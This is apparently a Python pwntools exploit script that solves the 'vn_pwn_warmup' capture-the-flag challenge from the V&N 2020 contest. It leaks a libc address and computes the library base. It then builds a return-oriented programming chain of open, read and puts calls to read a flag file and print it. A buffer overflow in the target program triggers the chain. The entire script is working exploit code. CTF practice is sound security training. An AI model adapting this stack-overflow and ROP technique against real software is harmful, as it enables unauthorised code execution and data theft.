#https://www.cnblogs.com/luoleqi/p/12468271.html, http://www.starssgo.top/2020/03/04/%C2%96%C2%96%C2%96%C2%96-V-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B-pwn/#warmup
# -*- coding: utf-8 -*
from pwn import *
from LibcSearcher import *
context.arch = 'amd64'
#context.log_level = 'debug'

def z(a=''):
	gdb.attach(p,a)
	if a == '':
		raw_input()

p = process('./vn_pwn_warmup')
#p = remote('node3.buuoj.cn',29892)
p.recvuntil("0x")	
puts_addr=int(p.recv(12),16)
print "puts_addr=", hex(puts_addr)

libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libcbase_addr=puts_addr-libc.symbols['puts']
print "libcbase=", hex(libcbase_addr)

#mov_rdi_rsi_ret=libcbase_addr+libc.search(asm("mov rdi,r13\nret")).next()
pop_rdi_ret=libcbase_addr+libc.search(asm("pop rdi\nret")).next()
pop_rsi_ret=libcbase_addr+libc.search(asm("pop rsi\nret")).next()
pop_rdx_ret=libcbase_addr+libc.search(asm("pop rdx\nret")).next()
open_addr=libcbase_addr+libc.symbols['open']
print "open_addr=", hex(open_addr)
free_hook=libcbase_addr+libc.symbols['__free_hook']
print "free_hook=", hex(free_hook)
read_addr=libcbase_addr+libc.symbols['read']
print "read_addr=", hex(read_addr)
puts_addr=libcbase_addr+libc.symbols['puts']
print "puts_addr=", hex(puts_addr)

payload=p64(0)+p64(pop_rsi_ret)+p64(free_hook)+p64(pop_rdx_ret)+p64(4)+p64(read_addr) #read(0, free_hook, 4)
payload+=p64(pop_rdi_ret)+p64(free_hook)+p64(pop_rsi_ret)+p64(0)+p64(open_addr) #rax = open(free_hook, 0), fd=3, #define O_RDONLY 00
payload+=p64(pop_rdi_ret)+p64(3)+p64(pop_rsi_ret)+p64(free_hook)+p64(pop_rdx_ret)+p64(0x30)+p64(read_addr) # read(3, free_hook, 0x30)
payload+=p64(pop_rdi_ret)+p64(free_hook)+p64(puts_addr)

p.sendafter("Input something: ",payload)
p.sendafter("What's your name?",'a'* 0x78+p64(pop_rdi_ret))
#z()
p.send("flag")

p.interactive()